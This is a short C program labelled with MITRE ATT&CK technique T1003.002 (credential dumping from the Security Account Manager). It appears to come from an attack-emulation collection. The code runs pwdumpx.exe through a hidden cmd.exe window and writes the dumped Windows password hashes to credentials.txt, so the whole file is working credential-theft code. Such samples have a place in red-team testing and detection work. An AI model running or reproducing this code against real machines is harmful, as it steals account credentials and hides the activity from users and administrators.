// Link      = https://attack.mitre.org/techniques/T1003/002/
// Technique = OS Credential Dumping: Security Account Manager
// ID        = T1003.002
// Tactics   = Credential Access

#include <windows.h>

int main() {
    ShellExecuteA(
        NULL,
        "open",
        "cmd.exe",
        "pwdumpx.exe > credentials.txt",
        NULL,
        SW_HIDE
    );


    return 0;
}


